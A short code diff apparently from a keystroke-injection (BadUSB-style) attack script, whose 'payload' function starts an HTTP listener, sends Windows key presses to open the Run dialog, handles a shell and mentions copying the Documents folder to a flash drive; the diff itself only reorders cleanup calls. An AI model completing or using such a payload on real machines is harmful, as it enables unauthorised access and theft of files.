@@ -76,7 +76,6 @@ def payload(web_dir):
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
 	os.chdir("..")
-	sleep(1)
 	eco.press("WIN+d")
 	sleep(1)
 	eco.press("LGUI+r")
@@ -93,8 +92,8 @@ def payload(web_dir):
 	print("Shell exited")
 	# Copy Documents Directory to Flash Drive
 	httpd.server_close()
-	httpd.close()
 	httplistener.join()
+	httplistener.close()
 	eco.type("exit")
 	eco.press("ENTER")
 
